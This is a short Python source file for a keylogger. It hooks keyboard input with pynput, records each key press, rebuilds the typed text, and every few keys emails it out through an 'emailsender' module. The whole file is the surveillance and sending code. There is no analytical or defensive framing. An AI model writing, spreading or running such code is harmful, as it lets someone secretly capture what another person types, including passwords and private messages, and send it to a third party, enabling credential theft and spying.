import pynput
from pynput.keyboard import Key, Listener
import emailsender

count = 0
keys = []

def press(key):
    global keys, count
    try:
        keys.append(str(key))
    except AttributeError:
        keys.append(f"{key}")
    
    count += 1
    
    if count > 10:
        count = 0
        email(keys)

def email(keys):
    message = ""
    for key in keys:
        k = key.replace("'", "")
        if key == "Key.space":
            k = " "
        elif key == "Key.enter":
            k = "\n"
        elif key == "Key.tab":
            k = "\t"
        elif key.find("Key") > 0:
            k = ""
        message += k

    print(message)
    emailsender.sendEmail(message)

def release(key):
    if key == Key.esc:
        return False
    
with Listener(on_press=press, on_release=release) as listener:
    listener.join()
